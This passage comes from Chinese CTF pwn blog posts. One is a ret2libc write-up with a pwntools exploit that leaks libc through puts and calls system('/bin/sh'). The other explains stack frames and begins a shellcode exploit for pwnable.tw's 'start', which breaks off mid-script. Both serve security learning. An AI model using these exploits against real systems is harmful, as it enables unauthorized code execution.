0x804869c:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffd050 <span class="token punctuation">(</span><span class="token string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffd054 <span class="token punctuation">(</span><span class="token string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffd058 <span class="token punctuation">(</span><span class="token string">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffd05c <span class="token punctuation">(</span><span class="token string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffd060 <span class="token punctuation">(</span><span class="token string">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffd064 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffd068 <span class="token punctuation">(</span><span class="token string">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048695    30    <span class="token keyword">in</span> ret2libcGOT.cgdb-peda$ pattern offset AA8AANAAA8AANA found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>存在栈溢出，可利用函数为puts  gets。我们构造一个puts函数让其输出puts函数的got表地址上的内容–即真正的地址，利用栈溢出控制程序转跳来实现。得到puts函数的确切地址后找到该函数在libc文件中的offset即求出libc地址，有了libc地址啥都好说。将上面构造的puts函数返回地址设置为main函数就可再次进行程序控制，不过这次控制它打开shell。</strong></p><p>exp：libc的地址也可以用__libc_start_main_got来获得</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"ret2libc3"</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#__libc_start_main_got = elf.got['__libc_start_main']</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload1 = "A"*112 + p32(puts_plt) + p32(main_addr) + p32(__libc_start_main_got)</span>payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"><a href="#在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化" class="headerlink" title="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"></a>在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化</h3><h2 id="4-探究"><a href="#4-探究" class="headerlink" title="4:探究"></a>4:探究</h2><p>我们来看看main函数的反汇编：</p><pre class=" language-bash"><code class="language-bash"> 08048618 <span class="token operator">&lt;</span>main<span class="token operator">></span>: 8048618:    55                       push   ebp     8048619:    89 e5                    mov    ebp,esp 804861b:    83 e4 f0                 and    esp,0xfffffff0 804861e:    83 c4 80                 add    esp,0xffffff80 8048621:    a1 60 a0 04 08           mov    eax,ds:0x804a060 8048626:    c7 44 24 0c 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0xc<span class="token punctuation">]</span>,0x0 804862d:    00  804862e:    c7 44 24 08 02 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,0x2 8048635:    00  8048636:    c7 44 24 04 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x0 804863d:    00  804863e:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 8048641:    e8 5a fe ff ff           call   80484a0 <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span> 8048646:    a1 40 a0 04 08           mov    eax,ds:0x804a040 804864b:    c7 44 24 0c 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0xc<span class="token punctuation">]</span>,0x0 8048652:    00  8048653:    c7 44 24 08 01 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,0x1 804865a:    00  804865b:    c7 44 24 04 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x0 8048662:    00  8048663:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 8048666:    e8 35 fe ff ff           call   80484a0 <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span> 804866b:    c7 04 24 40 87 04 08     mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x8048740 8048672:    e8 e9 fd ff ff           call   8048460 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span> 8048677:    c7 04 24 6b 87 04 08     mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x804876b 804867e:    e8 ad fd ff ff           call   8048430 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span> 8048683:    8d 44 24 1c              lea    eax,<span class="token punctuation">[</span>esp+0x1c<span class="token punctuation">]</span> 8048687:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 804868a:    e8 b1 fd ff ff           call   8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span> 804868f:    b8 00 00 00 00           mov    eax,0x0 8048694:    c9                       leave   8048695:    c3                       ret   </code></pre><p>第一第二行是常规操作。</p><h4 id="第四第五行：被称为栈对齐"><a href="#第四第五行：被称为栈对齐" class="headerlink" title="第四第五行：被称为栈对齐"></a>第四第五行：被称为栈对齐</h4><pre class=" language-bash"><code class="language-bash">804861b:    83 e4 f0                 and    esp,0xfffffff0  //esp最后一个字节清零804861e:    83 c4 80                 add    esp,0xffffff80  //esp倒数第二个字节如果大于等于8则变为8，小于则清零，倒数第一个字节也清零</code></pre><h3 id="栈对齐有关资料：64位"><a href="#栈对齐有关资料：64位" class="headerlink" title="栈对齐有关资料：64位"></a>栈对齐有关资料：64位</h3><blockquote><p>许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象的地址必须是某个值K的倍数，其中K具体如下图。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。举个实际的例子：比如我们在内存中读取一个8字节长度的变量，那么这个变量所在的地址必须是8的倍数。如果这个变量所在的地址是8的倍数，那么就可以通过一次内存操作完成该变量的读取。倘若这个变量所在的地址并不是8的倍数，那么可能就需要执行两次内存读取，因为该变量被放在两个8字节的内存块中了。</p></blockquote><blockquote><p>无论数据是否对齐，x86_64硬件都能正常工作，但是却会降低系统的性能，所以我们的编译器在编译时一般会为我们实施数据对齐。</p></blockquote><blockquote><p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。<br>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p><blockquote><blockquote><p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：<br>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。<br>大多数函数的栈帧的边界都必须是16直接的倍数。<br>在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p></blockquote></blockquote></blockquote><p>详情见：<a href="https://www.cnblogs.com/tcctw/p/11333743.html" target="_blank" rel="noopener">https://www.cnblogs.com/tcctw/p/11333743.html</a></p><p>总结：为了满足数据对齐和栈字节对齐的要求，或者说规范，编译器不惜牺牲了部分内存，这使得程序提高了兼容性，也提高了程序的性能</p><p><strong>在常规操作push  ebp 和mov  ebp，esp后面免不了这种调整栈空间的指令 这样的指令对第一次求溢出是没有影响的，因为只要看最后的ret部分。但是如果进行第二次攻击再次从main函数进入将再次执行这样的影响 esp的指令 我们再次使用之前的溢出点就可能会出错。就像这里的栈对齐操作，显然这个操作与esp本身的大小有关。在程序最后直接ret到main函数会导致esp加4从而下次的栈对齐操作因为esp变化了所以栈空间也会发生变化。导致变化完了后esp到ebp的距离不再是114. 解决方法就是在脚本中用gdb.attach()进入调试在即将进行第二次之前在main函数下断点，从而观察，调整溢出点。</strong></p><h3 id="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"><a href="#下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104" class="headerlink" title="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"></a>下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104</h3><pre class=" language-bash"><code class="language-bash">EBX: 0x0 ECX: 0xf7f9b5c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7f9c89c --<span class="token operator">></span> 0x0 ESI: 0xf7f9b000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ESP: 0xffbedef4 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>EIP: 0x8048695 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868a <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x804868f <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x8048694 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048695 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   0x804869c:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffbedef4 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffbedef8 <span class="token punctuation">(</span><span class="token string">"AAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffbedefc --<span class="token operator">></span> 0xf7e02d10 <span class="token punctuation">(</span><span class="token operator">&lt;</span>system<span class="token operator">></span>:    sub    esp,0xc<span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffbedf00 --<span class="token operator">></span> 0x0 0016<span class="token operator">|</span> 0xffbedf04 --<span class="token operator">></span> 0xf7f418cf <span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffbedf08 --<span class="token operator">></span> 0xf7f9b000 --<span class="token operator">></span> 0x1d4d6c 0024<span class="token operator">|</span> 0xffbedf0c --<span class="token operator">></span> 0xf7fce75a <span class="token punctuation">(</span>add    edi,0x178a6<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffbedf10 --<span class="token operator">></span> 0xf7fe6000 --<span class="token operator">></span> 0x26f34 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value</code></pre><p>最终结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive modev\x84\x04\x86\x84\x04\x90m���Z��\xb6\x84\x04Ƅ\x04No surprise anymore, system disappeard QQ.Can you <span class="token function">find</span> it <span class="token operator">!</span>?$ <span class="token function">ls</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>StackOverFlow之Ret2ShellCode详解</title>
      <link href="/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/"/>
      <url>/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="函数调用时栈中的变化-test"><a href="#函数调用时栈中的变化-test" class="headerlink" title="函数调用时栈中的变化 test"></a>函数调用时栈中的变化 test</h1><p>示例代码:test.c</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">fun</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>编译程序： gcc test.c -m32 -fno-stack-protector -z execstack -no-pie -o test</strong><br><strong>-fno-stack-protector   ————关闭栈保护 stack</strong><br><strong>-z execstack   ————关闭NX堆栈不可执行</strong><br><strong>-no-pie   ————关闭PIE地址随机化</strong></p><p><strong>然后对test用linux自带的反汇编指令：objdump进行反汇编  objdump -d  :反汇编特定指令机器码的section  -Mintle ：表示用intel语法</strong></p><pre class=" language-bash"><code class="language-bash">objdump test1 -d -Mintel主要函数结果如下080483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>: 80483f6:    55                       push   ebp 80483f7:    89 e5                    mov    ebp,esp 80483f9:    e8 42 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span> 80483fe:    05 02 1c 00 00           add    eax,0x1c02 8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span> 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span> 8048409:    01 d0                    add    eax,edx 804840b:    5d                       pop    ebp 804840c:    c3                       ret    0804840d <span class="token operator">&lt;</span>main<span class="token operator">></span>: 804840d:    55                       push   ebp 804840e:    89 e5                    mov    ebp,esp 8048410:    83 ec 10                 sub    esp,0x10 8048413:    e8 28 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span> 8048418:    05 e8 1b 00 00           add    eax,0x1be8 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span> 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span> 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span> 8048436:    83 c4 08                 add    esp,0x8 8048439:    b8 00 00 00 00           mov    eax,0x0 804843e:    c9                       leave   804843f:    c3                       ret    </code></pre><p> 观察fun函数可以发现：</p><pre class=" language-bash"><code class="language-bash">push   ebpmov   ebp,esp<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">..</span><span class="token punctuation">..</span>.pop ebpret</code></pre><p><em>这段指令标志这一个函数的开始与结束。这四句指令就是函数开辟，栈帧就是一块被ebp和esp夹住的区域的开始与结尾的标志性语句</em></p><p>现在调试看看main函数对fun函数的调用和传值在汇编中是怎样的<br>相关指令：</p><pre class=" language-bash"><code class="language-bash"> 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1   //将1传给 以<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） a <span class="token operator">=</span> 1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2   //将2传给 以<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） b <span class="token operator">=</span> 2 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>区域的值以32位入栈  即  b <span class="token operator">=</span> 2 入栈 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>区域的值以32位入栈  即  a <span class="token operator">=</span> 1 入栈 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>  //调用fun函数</code></pre><p><strong>可以发现参数入栈的顺序 与我们c语言正常的调用顺序是相反的：参数逆序入栈。</strong><br><strong><em>调用一个函数前都是先压入参数(没有参数就不用)然后再调用函数汇编表现为 push xxx ; push xxx; push xxx; call xxx的形式</em></strong></p><p>继续看fun函数中对参数的调用（忽略前面两条指令）</p><pre class=" language-bash"><code class="language-bash">8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>区域的值传给edx 即 edx <span class="token operator">=</span> 1 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>区域的值传给eax 即 eax <span class="token operator">=</span> 2 8048409:    01 d0                    add    eax,edx  //eax <span class="token operator">=</span> eax + edx</code></pre><p><em>为啥[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]：</em></p><pre class=" language-bash"><code class="language-bash">主要影响指令main:804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">..</span>.<span class="token punctuation">..</span>fun:80483f6:    55                       push   ebp804840e:    89 e5                    mov    ebp,esp  //esp 与 ebp指向同一位置</code></pre><p>示意图<br><img src="https://s1.ax1x.com/2020/07/02/NbwCIH.png" alt=""><br>再试着去理解[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]的原因就很明了了</p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>此题源程序可以从 pwnable.tw 中获取<br>用checksec 发现保护全关</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/overflow/Ret2ShellCode/start'</span>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>因为次elf文件过于简单就没使用IDA了直接linux反汇编</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/wiki/overflow/Ret2ShellCode$ objdump start -d -Mintelstart：     文件格式 elf32-i386Disassembly of section .text:08048060 <span class="token operator">&lt;</span>_start<span class="token operator">></span>: 8048060:    54                       push   esp 8048061:    68 9d 80 04 08           push   0x804809d  //压入exit函数地址 8048066:    31 c0                    xor    eax,eax 8048068:    31 db                    xor    ebx,ebx 804806a:    31 c9                    xor    ecx,ecx 804806c:    31 d2                    xor    edx,edx 804806e:    68 43 54 46 3a           push   0x3a465443   //压入字符串 8048073:    68 74 68 65 20           push   0x20656874 8048078:    68 61 72 74 20           push   0x20747261 804807d:    68 73 20 73 74           push   0x74732073 8048082:    68 4c 65 74 27           push   0x2774654c 8048087:    89 e1                    mov    ecx,esp 8048089:    b2 14                    mov    dl,0x14  //0x14 <span class="token operator">=</span> 20 804808b:    b3 01                    mov    bl,0x1 804808d:    b0 04                    mov    al,0x4 804808f:    <span class="token function">cd</span> 80                    int    0x80   //调用write 8048091:    31 db                    xor    ebx,ebx 8048093:    b2 3c                    mov    dl,0x3c  //0x3c <span class="token operator">=</span> 60 8048095:    b0 03                    mov    al,0x3 8048097:    <span class="token function">cd</span> 80                    int    0x80   //调用read 8048099:    83 c4 14                 add    esp,0x14 804809c:    c3                       ret    0804809d <span class="token operator">&lt;</span>_exit<span class="token operator">></span>: 804809d:    5c                       pop    esp 804809e:    31 c0                    xor    eax,eax 80480a0:    40                       inc    eax 80480a1:    <span class="token function">cd</span> 80                    int    0x80</code></pre><p>可以看出这整个程序就_start和_exit两个函数。看代码应该是出题者可以构造的因为按照正常的栈首先因该是 push  ebp而不是esp<br><strong>int 0x80 ; 这代表着系统中断也就是调用系统函数类似于之前所说的call xxxx; 结构不同的是这里面的参数都是寄存器传参</strong>sys_write(fd,&amp;buf,len)ebx 存放的是 fd(文件描述符有0、1、2三个值0代表标准输入1代表标准输出2代表标准错误输出)ecx 中存放的是 buf 的地址也就是将要输出的字符串的首地址edx 存放的是输出字符串的长度<br>mov  ecx,esp因为 esp 指向栈顶且根据实际程序输出ecx 就是存放着 Let’s start the CTF:</p><p>分析两次int 0x80的寄存器参数可知 ：第一次write函数将Let’s start the CTF:恰好20个字符输出。<strong>第二次read函数将读取60个字符，栈溢出。一定注意不论是调用write函数还是read函数在输出和输入字符串时esp并没有立刻改变而是等到特定的指令。</strong></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>在调用 sys_write() 之前栈帧情况<br><img src="https://s1.ax1x.com/2020/07/02/NbwFJA.png" alt=""><br>蓝色就是buf部分执行sys_read函数时esp 还是指向此地 输入的内容重新覆盖这块缓冲区超出的部分继续向下覆盖。<br>因为ret_addr保存的是exit函数的地址正常返回的话是直接退出程序现在需要控制这个地址使其返回到我们想要去的地方。<br>在write（）后面add    esp,0x14指令将esp指向ret_addr 完成ret指令后 esp指向 原esp地址即指向的数据与地址重合。<br>那么如果我们控制ret再次跳到write函数那么esp地址会被泄露，继续下面的read函数，在read函数中我们就可以写入shellcode，控制其位置然后执行。<br><img src="https://s1.ax1x.com/2020/07/02/NbwkRI.png" alt=""></p><p>执行完sys_read()函数之后还需执行 add esp,0x14 所以 shellcode 能放的地方也只有剩下的40字节但也足够了。</p><p><img src="https://s1.ax1x.com/2020/07/02/Nbwiid.png" alt=""><br>所以 shellcode 的起始地址为 esp+20,之前的部分可任意填充除 ’\x00‘ (会造成截断)之外的内容。<br>exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./start'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#有时'./start'还是"start"或是"./start"也会引发玄学问题，多注意</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08048087</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#此处如果换成sendline会出错，原因目前未知，感觉很玄学</span>stack_addr <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>addr <span class="token operator">=</span>  u32<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>nopsled <span class="token operator">=</span> <span class="token string">'\x90'</span> <span class="token operator">*</span> <span class="token number">10</span>shellcode <span class="token operator">=</span><span class="token 